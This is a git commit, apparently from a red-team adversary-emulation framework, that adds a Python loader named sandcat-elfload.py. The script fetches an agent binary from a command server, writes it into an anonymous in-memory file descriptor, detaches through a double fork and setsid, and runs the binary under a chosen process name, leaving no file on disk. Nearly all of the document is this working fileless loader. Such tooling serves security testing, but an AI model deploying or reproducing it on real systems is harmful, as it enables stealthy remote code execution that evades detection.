9c3bd557ad12f8f2db2aee2930e0baa81b1b1b88
Christopher Tran <christophert@users.noreply.github.com>
2019-12-27 08:59:03 -0500

    VIRTS-588b/Sandcat In-Memory Payload (#199)
    * Add sandcat linux in-memory payload supporting files. Pulled from sandcat/VIRTS-588 main branch
    
    * add sandcat template file with new command
    
    
    Former-commit-id: a01105a5e9250ca951404fc8ba7a5904c15d10a2

---
+++ payloads/sandcat-elfload.py
@@ -0,0 +1,35 @@
+from __future__ import print_function  # import for Python2/3 compatibility
+import os
+import io
+import ctypes
+import requests
+
+# pull environment variables for server, group, and process name
+proc_name = os.getenv('SC_PROC_NAME', 'sandcat')
+server = os.getenv('SC_DEFAULTSERVER', 'http://localhost:8888')
+group = os.getenv('SC_DEFAULTGROUP', 'my_group')
+
+print("{} {} {}".format(proc_name, server, group))
+
+headers = dict(file='sandcat.go', platform='linux', defaultServer=server, defaultGroup=group)
+r = requests.get('%s/file/download' % server, headers=headers, stream=True)
+print(r.status_code)
+if r.status_code == 200:
+    print("OK")
+    obj = io.BytesIO(r.content)
+    fd = ctypes.CDLL(None).syscall(319, "", 1)
+    final_fd = open('/proc/self/fd/%s' % str(fd), 'wb')  # write exec
+    final_fd.write(obj.read())
+    final_fd.close()
+
+    fork1 = os.fork()
+    if 0 != fork1:
+        os._exit(0)
+
+    ctypes.CDLL(None).syscall(112)
+
+    fork2 = os.fork()
+    if 0 != fork2:
+        os._exit(0)
+
+    os.execl('/proc/self/fd/%s' % str(fd), proc_name)  # replace existing proc with new process and execute new binary
